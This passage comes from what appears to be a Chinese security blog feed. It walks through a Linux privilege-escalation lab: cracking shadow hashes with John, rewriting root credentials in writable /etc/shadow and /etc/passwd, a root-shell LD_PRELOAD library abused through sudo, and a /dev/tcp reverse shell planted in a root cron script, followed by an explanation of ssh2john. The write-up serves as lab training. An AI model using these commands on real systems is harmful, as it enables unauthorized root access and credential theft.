+</span></span><span style="display:flex;"><span>user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>                                                                                                       
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">2</span> password hashes with <span style="color:#ae81ff">2</span> different salts <span style="color:#f92672">(</span>sha512crypt, crypt<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> $6$ <span style="color:#f92672">[</span>SHA512 128/128 AVX 2x<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">5000</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">8</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>password123      <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>password321      <span style="color:#f92672">(</span>user<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>2g 0:00:00:07 DONE <span style="color:#f92672">(</span>2026-01-14 05:55<span style="color:#f92672">)</span> 0.2735g/s 8474p/s 8685c/s 8685C/s simone13..kelly17
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed. 
+</span></span></code></pre></div><p>尝试登入。</p>
+<p><img src="Pasted%20image%2020260114185635.png" alt=""></p>
+<h3 id="可写-shadow-文件利用">可写 shadow 文件利用</h3>
+<p>查看 <code>/etc/shadow</code> 文件发现可写。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ ls -liah /etc/shadow
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1241132</span> -rw-r--rw- <span style="color:#ae81ff">1</span> root shadow <span style="color:#ae81ff">842</span> Apr <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2023</span> /etc/shadow
+</span></span></code></pre></div><p>备份 shadow 文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ cp /etc/shadow /tmp/shadow.bak
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ ls /tmp
+</span></span><span style="display:flex;"><span>backup.tar.gz  shadow.bak  useless
+</span></span></code></pre></div><p>制作要替换的 sha-512 密码。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ mkpasswd -m sha-512 enilmalus
+</span></span><span style="display:flex;"><span>$6$1jXHC49QenfimFS4$ncBkl6H.3JA9N2ZoTHCpu4g68lTPlX0RFYiFEkHA8I3.AgWcKiL0mtrUiC5Ue87TP8eIEWDe/Dij4hP5gb/Gm0
+</span></span></code></pre></div><p>修改 <code>/etc/shadow</code> 的 <code>root</code> 密码凭据。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ vim /etc/shadow
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ cat /etc/shadow | grep <span style="color:#e6db74">&#39;root&#39;</span>
+</span></span><span style="display:flex;"><span>root:$6$1jXHC49QenfimFS4$ncBkl6H.3JA9N2ZoTHCpu4g68lTPlX0RFYiFEkHA8I3.AgWcKiL0mtrUiC5Ue87TP8eIEWDe/Dij4hP5gb/Gm0:17298:0:99999:7:::
+</span></span></code></pre></div><p>尝试登入。</p>
+<p><img src="Pasted%20image%2020260114190632.png" alt=""></p>
+<h3 id="可写-passwd-文件利用">可写 passwd 文件利用</h3>
+<p>查看 <code>/etc/passwd</code> 文件发现可写。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ae81ff">1241288</span> -rw-r--rw- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">998</span> Apr <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2023</span> /etc/passwd
+</span></span></code></pre></div><p>备份 <code>/etc/passwd</code> 文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ cp /etc/passwd /tmp/passwd.bak
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ ls -liah /tmp/passwd.bak
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1158728</span> -rw-r--r-- <span style="color:#ae81ff">1</span> user user <span style="color:#ae81ff">998</span> Jan <span style="color:#ae81ff">14</span> 06:10 /tmp/passwd.bak
+</span></span></code></pre></div><p>制作并替换 root 密码。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ openssl passwd enilmalus
+</span></span><span style="display:flex;"><span>Warning: truncating password to <span style="color:#ae81ff">8</span> characters
+</span></span><span style="display:flex;"><span>8KZAn18Dg1XO6
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ vim /etc/passwd
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ cat /etc/passwd | grep <span style="color:#e6db74">&#39;root&#39;</span>
+</span></span><span style="display:flex;"><span>root:8KZAn18Dg1XO6:0:0:root:/root:/bin/bash
+</span></span></code></pre></div><p>尝试登入。</p>
+<p><img src="Pasted%20image%2020260114191253.png" alt=""></p>
+<h3 id="sudo-环境变量提权">sudo 环境变量提权</h3>
+<p>枚举 sudo 权限，发现有 <code>LD_PRELOAD</code> 选项。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> user on this host:
+</span></span><span style="display:flex;"><span>    env_reset, env_keep<span style="color:#f92672">+=</span>LD_PRELOAD
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User user may run the following commands on this host:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/sbin/iftop
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/find
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/nano
+</span></span></code></pre></div><p><code>LD_PRELOAD</code> 允许任何程序使用共享库的功能。如果启用了 <code>env_keep</code> 选项，我们可以生成一个共享库，该共享库在允许程序之前加载和执行。</p>
+<ol>
+<li>检查 <code>LD_PRELOAD</code> （带有 env_keep 选项）</li>
+<li>编写一个简单的 C 代码作为共享对象（.so 扩展名）文件编译</li>
+<li>使用 sudo 权限指向我们的 .so 文件的 <code>LD_PRELOAD</code> 选项运行程序</li>
+</ol>
+<p>制作 root shell。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:/tmp/env_privTEST$ vim shell.c
+</span></span><span style="display:flex;"><span>user@RedteamNotes:/tmp/env_privTEST$ cat shell.c 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdio.h&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdlib.h&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;sys/types.h&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>void _init<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        unsetenv<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>        setgid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>        setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>        system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>编译文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:/tmp/env_privTEST$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+</span></span><span style="display:flex;"><span>user@RedteamNotes:/tmp/env_privTEST$ ls
+</span></span><span style="display:flex;"><span>shell.c  shell.so
+</span></span></code></pre></div><p>现在我们使用 sudo 运行任何程序时都可以使用此共享文件，通过指定 <code>LD_PRELOAD</code> 运行程序。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:/tmp/env_privTEST$ pwd
+</span></span><span style="display:flex;"><span>/tmp/env_privTEST
+</span></span><span style="display:flex;"><span>user@RedteamNotes:/tmp/env_privTEST$ ls
+</span></span><span style="display:flex;"><span>shell.c  shell.so
+</span></span><span style="display:flex;"><span>user@RedteamNotes:/tmp/env_privTEST$ sudo LD_PRELOAD<span style="color:#f92672">=</span>/tmp/env_privTEST/shell.so find
+</span></span><span style="display:flex;"><span>root@RedteamNotes:/tmp/env_privTEST# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>解释一下：</p>
+<ul>
+<li>LD：Linker Dynamic，即动态链接器，是操作系统中的一个组件，负责在程序运行时链接共享库到程序中。</li>
+<li>PRELOAD：预加载，意味着在程序运行前动态链接库先加载有 LD_PRELOAD 环境变量指定的共享库。</li>
+</ul>
+<h3 id="自动任务文件提权">自动任务文件提权</h3>
+<p>枚举自动任务。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ cat /etc/crontab
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /etc/crontab: system-wide crontab</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># command to install the new version when you edit this file</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and files in /etc/cron.d. These files also have username fields,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># that none of the other crontabs do.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SHELL<span style="color:#f92672">=</span>/bin/sh
+</span></span><span style="display:flex;"><span>PATH<span style="color:#f92672">=</span>/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># m h dom mon dow user  command</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">17</span> *    * * *   root    cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.hourly
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">25</span> <span style="color:#ae81ff">6</span>    * * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.daily <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">47</span> <span style="color:#ae81ff">6</span>    * * <span style="color:#ae81ff">7</span>   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">52</span> <span style="color:#ae81ff">6</span>    <span style="color:#ae81ff">1</span> * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>* * * * * root overwrite.sh
+</span></span><span style="display:flex;"><span>* * * * * root /usr/local/bin/compress.sh
+</span></span></code></pre></div><p>可以发现每分钟以 root 权限运行 overwrite.sh 与 /usr/local/bin/compress.sh，查找阅读一下 overwrite.sh 的内容。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ locate overwrite.sh
+</span></span><span style="display:flex;"><span>/usr/local/bin/overwrite.sh
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ ls -liah /usr/local/bin/overwrite.sh
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">816761</span> -rwxr--rw- <span style="color:#ae81ff">1</span> root staff <span style="color:#ae81ff">40</span> May <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2017</span> /usr/local/bin/overwrite.sh
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ cat /usr/local/bin/overwrite.sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">`</span>date<span style="color:#e6db74">`</span> &gt; /tmp/useless
+</span></span></code></pre></div><p>发现可以修改 overwrite.sh 的内容，进行修改。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ vim /usr/local/bin/overwrite.sh
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ cat /usr/local/bin/overwrite.sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bash -i &gt;&amp; /dev/tcp/10.10.10.5/4444 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>在 kali 上监听 4444 端口，等待自动任务运行得到回显。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo rlwrap -cAr nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.10.5<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.12<span style="color:#f92672">]</span> <span style="color:#ae81ff">34407</span>
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>root@RedteamNotes:~# whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div>]]></content></item><item><title>John 工作原理分析</title><link>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</link><pubDate>Thu, 01 Jan 2026 00:40:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</guid><description>&lt;h2 id="ssh2john-提取私钥"&gt;ssh2john 提取私钥&lt;/h2&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;┌──&lt;span style="color:#f92672"&gt;(&lt;/span&gt;kali㉿kali&lt;span style="color:#f92672"&gt;)&lt;/span&gt;-&lt;span style="color:#f92672"&gt;[&lt;/span&gt;~/Work/Kali&lt;span style="color:#f92672"&gt;]&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;└─$ ssh2john id_rsa | tee key_hash
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;SSH 私钥文件本身采用专门的格式储存，其中包含了加密的参数消息、加密算法以及密文数据，而不是直接的密码哈希字符串，私钥加密时会采用密钥派生函数（如 PBKDF2 或 bcrypt ）来对口令生成对称密钥，然后用该密钥对私钥数据进行加密，使得文件内容看起来像是一段难以辨别的编码数据。John 是一个专门用于破解密码哈希的工具，他需要知道加密算法的具体参数（例如加密方式、迭代次数、盐值等），才能通过暴力破解或者字典攻击验证猜测的口令是否正确。ssh2john 就是用来解析 SSH 私钥文件，提取出其中的加密参数和密文数据，构造出一个标准化的哈希格式，这种格式正式 John 能够识别并处理的。只有经过这种转换，John 才能根据已知的加密参数对猜测的口令进行验证，否则直接对原始密钥文件进行暴力破解是不现实的，因为文件格式本身并不直接暴露口令的哈希。&lt;/p&gt;
